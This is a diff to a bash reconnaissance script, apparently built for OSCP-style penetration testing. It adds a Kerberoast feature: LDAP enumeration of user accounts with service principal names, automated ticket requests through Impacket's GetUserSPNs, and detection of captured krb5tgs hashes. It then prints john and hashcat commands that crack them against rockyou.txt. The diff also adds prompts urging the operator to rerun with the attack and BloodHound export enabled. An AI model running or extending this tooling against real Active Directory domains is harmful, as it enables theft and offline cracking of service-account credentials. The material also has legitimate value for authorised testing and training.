@@ -7,6 +7,8 @@
 # - HTTP redirect handling (multi)
 # - VHost fuzzing with discovered hosts
 # - Basic service checks: FTP, SMB, Docker, Redis, K8S
+# - Perform Bloodhound export
+# - Perform Kerberoast
 # - /etc/hosts suggestions
 # - Recon summary with next steps
 # ==============================
@@ -21,7 +23,6 @@
 #
 # Structured Output Sections (Readability)
 #
-#
 # CVE Hints → MITRE ATT&CK Mapping
 #  Port 445 → SMB relay
 #    ATT&CK: T1557, T1021.002
@@ -30,9 +31,6 @@
 #  [SMB + LDAP + Kerberos]
 #    → Likely Active Directory
 #    → Try AS-REP roast → SMB → WinRM
-#
-# Fix why "SMB auth failed for provided credentials" is displayed
-#    when the creds clearly output SMB Shares.
 #
 # Align output with OSCP-style methodology
 #######################################################
@@ -48,6 +46,7 @@ ENABLE_VHOST=false
 ENABLE_KERB_ENUM=false
 ENABLE_WEB_ENUM=false
 ENABLE_BH_EXPORT=false
+ENABLE_KERBROAST=false
 KERBEROS_FOUND=false
 LDAP_FOUND=false
 LDAP_ENUM_DONE=false
@@ -118,6 +117,7 @@ for arg in "$@"; do
         --domain=*) AUTH_DOMAIN="${arg#*=}" ;;
         --web-enum) ENABLE_WEB_ENUM=true ;;
         --run-blood) ENABLE_BH_EXPORT=true ;;
+        --kerberoast) ENABLE_KERBROAST=true ;;
         *) [ -z "$TARGET" ] && TARGET="$arg" ;;
     esac
 done
@@ -655,6 +655,32 @@ ldap_enum() {
     ldapsearch "${LDAP_BIND_ARGS[@]}" -H "$LDAP_URI" -b "$LDAP_BASE_DN" \
         "(servicePrincipalName=*)" sAMAccountName servicePrincipalName 2>/dev/null \
         | awk '/^sAMAccountName:/ {print "    - "$2}'
+
+    ########################################
+    # Kerberoast Target Detection (LDAP-only)
+    ########################################
+    KERBEROAST_FILE="kerberoast_${TARGET}_${DATE_TAG}.txt"
+
+    SPN_USERS=$(ldapsearch "${LDAP_BIND_ARGS[@]}" -H "$LDAP_URI" -b "$LDAP_BASE_DN" "(&(objectClass=user)(servicePrincipalName=*)(!(sAMAccountName=krbtgt)))" \
+        sAMAccountName servicePrincipalName 2>/dev/null)
+
+    if echo "$SPN_USERS" | grep -q "^dn:"; then
+        high_risk "Potential Kerberoast targets detected (SPNs on user accounts)"
+        #echo "# Kerberoast Candidates for $TARGET" > "$KERBEROAST_FILE"
+        #echo "# Generated via LDAP enumeration (no tickets requested)" >> "$KERBEROAST_FILE"
+        #echo >> "$KERBEROAST_FILE"
+
+        echo "$SPN_USERS" \
+          | awk '
+            /^sAMAccountName:/ { user=$2 }
+            /^servicePrincipalName:/ {
+                print user " :: " $2
+            }
+          ' >> "$KERBEROAST_FILE"
+        success "Saved Kerberoast candidates to $KERBEROAST_FILE"
+    else
+        info "No user-based SPNs detected (no Kerberoast candidates)"
+    fi
 
     ########################################
     # 8. Optional ldapdomaindump
@@ -1566,6 +1592,9 @@ if [ -s "$KERB_MARKER" ]; then
     fi
 fi
 
+#############################################
+# Check to see what Credentials can access
+#############################################
 if $CREDS_PROVIDED; then
     #echo "[DEBUG] Creds were provided"
     # Check creds is Kerberos Service is deteted.
@@ -1616,14 +1645,96 @@ if $CREDS_PROVIDED; then
     fi
 fi
 
+########################################
+# Perform Attack: Kerberoast
+########################################
+if [[ "$ENABLE_KERBROAST" == true && "$CREDS_PROVIDED" == true && "$HAS_KERB" -eq 1 ]]; then
+
+    echo
+
+    if [[ ! -s "$KERBEROAST_FILE" ]]; then
+        warn "Kerberoast skipped — no SPNs detected during LDAP enumeration"
+        tip "Ensure users have servicePrincipalName attributes"
+        tip "Check manually: ldapsearch '(servicePrincipalName=*)'"
+        return 0
+    fi
+
+    alert "Kerberoast Candidates Identified"
+    info  "Attempting Kerberoast via Impacket"
+    lightbulb "Manual fallback:"
+    echo -e "  ${GREEN}impacket-GetUserSPNs '${AUTH_DOMAIN:-$LDAP_DOMAIN}/${AUTH_USER}:${AUTH_PASS}' -dc-ip $TARGET -request${RESET}"
+    echo
+
+    # Run Kerberoast safely and capture output
+    KERB_OUTPUT=$(impacket-GetUserSPNs \
+        "${AUTH_DOMAIN:-$LDAP_DOMAIN}/${AUTH_USER}:${AUTH_PASS}" \
+        -dc-ip "$TARGET" \
+        -request \
+        -outputfile "$KERBEROAST_FILE" 2>&1)
+    KERB_EXIT=$?
+
+    # Always show Impacket output
+    echo "$KERB_OUTPUT"
+    echo
+
+    if grep -q '\$krb5tgs\$' "$KERBEROAST_FILE"; then
+        success "Success! Kerberoast Hashes Captured!"
+        info "Saved to: ${BYELLOW}$KERBEROAST_FILE${RESET}"
+        echo -e "    Crack with: "
+        echo -e "        john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs $KERBEROAST_FILE"
+        echo -e "            Or "
+        echo -e "        hashcat -m 13100 $KERBEROAST_FILE /usr/share/wordlists/rockyou.txt --show"
+        echo
+    else
+    	warn "Kerberoast Attempt Failed!"
+        
+        if echo "$KERB_OUTPUT" | grep -qi "KRB_AP_ERR_SKEW"; then
+            lightbulb "Clock skew detected"
+            echo -e "    Fix on Kali:"
+            echo -e "        sudo ntpdate -u $TARGET"
+            echo -e "            Or"
+            echo -e "        sudo timedatectl set-ntp true"
+        fi
+
+        if echo "$KERB_OUTPUT" | grep -qi "CCache file is not found"; then
+            echo -e "    No Kerberos ticket cache found (normal if not using kinit)"
+            echo -e "    Impacket will fall back to password auth automatically"
+        fi
+
+        if echo "$KERB_OUTPUT" | grep -qi "KDC_ERR"; then
+            echo -e "    Kerberos error from DC — check credentials and domain"
+            echo -e "    Verify domain format: DOMAIN/user:pass"
+        fi
+        echo
+        warn "Kerberoast completed but no hashes were returned"
+        echo -e  "    SPNs may exist but account may be protected or not Kerberoastable"
+    fi
+elif [[ "$ENABLE_KERBROAST" == true && "$CREDS_PROVIDED" == true ]]; then
+    echo
+    info "${RED}Kerberoast skipped${RESET} (Kerberos port 88 not accessible)"
+
+elif [[ "$ENABLE_KERBROAST" == true ]]; then
+    echo
+    info "${RED}Kerberoast skipped${RESET} (credentials required)"
+fi
+
 # -------- Kerberos Reminder --------
-if [[ -s "$KERB_MARKER" && "$ENABLE_KERB_ENUM" == false ]]; then
+if [[ $HAS_KERB -eq 1 && "$ENABLE_KERB_ENUM" == false ]]; then
     echo
     alert "${BLUE}Tip:${RESET} Kerberos detected"
-    echo "  ----------------------------"
+    echo "  --------------------------------------"
     echo -e "    Re-run with ${BLUE}--kerb-enum${RESET} to attempt safe user enumeration"
     echo "    Example:"
     echo "      ./bash_simpleportscan.sh $TARGET --kerb-enum"
+fi
+# -------- Kerberoast Reminder --------
+if [[ -s "$KERBEROAST_FILE" && $HAS_KERB -eq 1 && "$ENABLE_KERBROAST" == false ]]; then
+    echo
+    alert "${BLUE}Tip:${RESET} Kerberoast Potential Detected"
+    echo "  --------------------------------------"
+    echo -e "    Re-run with ${BLUE}--kerberoast${RESET} to attempt kerberoast attack via Impacket"
+    echo "    Example:"
+    echo "      ./bash_simpleportscan.sh $TARGET --kerberoast"
 fi
 
 # --------- Detect HTTP/HTTPS availability ----------
@@ -1792,9 +1903,12 @@ if [[ $HAS_LDAP -eq 1 && $HAS_KERB -eq 1 && $DC_AUTH_OK -eq 1 ]]; then
    if [[ "$ENABLE_BH_EXPORT" == "true" ]]; then
        gather_bloodhound
    else
-      echo
+      echo     
       alert "${BLUE}Tip:${RESET} LDAP, KERB, & DC Authorized Access detected"
-      info "    — add ${BLUE}--run-blood${RESET} to enable auto bloodhound export"
+      echo "  --------------------------------------"
+      echo -e "    Re-run with ${BLUE}--run-blood${RESET} to enable auto bloodhound export"
+      echo "    Example:"
+      echo "      ./bash_simpleportscan.sh $TARGET --run-blood"
       echo
    fi
 fi
